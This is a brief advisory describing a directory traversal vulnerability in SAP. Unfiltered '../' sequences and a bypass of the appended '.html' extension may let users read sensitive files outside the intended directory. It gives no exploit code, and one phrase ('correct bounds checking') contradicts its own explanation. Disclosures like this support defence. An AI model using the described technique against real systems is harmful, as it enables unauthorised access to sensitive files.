SAP is said to be prone to a directory traversal vulnerability, potentially allowing users to disclose the contents of sensitive files. The problem occurs due to the application failing to parse user-supplied input for directory traversal sequences (../) and due to correct bounds checking verification, making it possible to bypass the appending of the .html exentsion to requested files. As a result, it may be possible to access sensitive files residing outside of the requested location.
